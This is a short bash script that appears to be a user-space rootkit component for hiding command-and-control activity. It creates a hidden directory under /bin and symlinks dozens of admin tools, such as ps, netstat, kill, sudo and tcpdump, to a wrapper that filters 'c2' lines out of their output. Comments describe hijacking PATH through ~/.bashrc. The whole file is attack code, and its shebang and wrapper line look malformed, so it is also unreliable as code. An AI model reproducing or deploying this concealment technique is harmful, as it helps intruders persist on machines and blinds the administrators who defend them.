!/bin/bash
function setupPwn(){
    # edit ~/.bashrc's
    # PATH=/bin/.usr/:${PATH}
    mkdir /bin/.usr/ 2>/dev/null
    cp ${PWD}/c2_bash_hide.sh /bin/.usr/
    # file located in first path /bin/.usr/c2_bash_hide.sh
    for f in "netstat" "iptables" "kill" "ps" "pgrep" "pkill" "ls" "rm" "rmdir" "passwd" "shutdown" "chmod" "sudo" "su" "cat" "useradd" "id" "ln" "unlink" "which" "gpasswd" "bash" "sh" "env" "echo" "history" "tcpdump" "chattr" "lsattr" "export" "mv" "grep" "egrep" "find"; do
        ln -s /bin/.usr/c2_bash_hide.sh /bin/.usr/${f};
    done;
}
function pwn(){
	`echo "$@"|grep -v c2 2>&1`;
}
pwn "$@"|grep -v c2
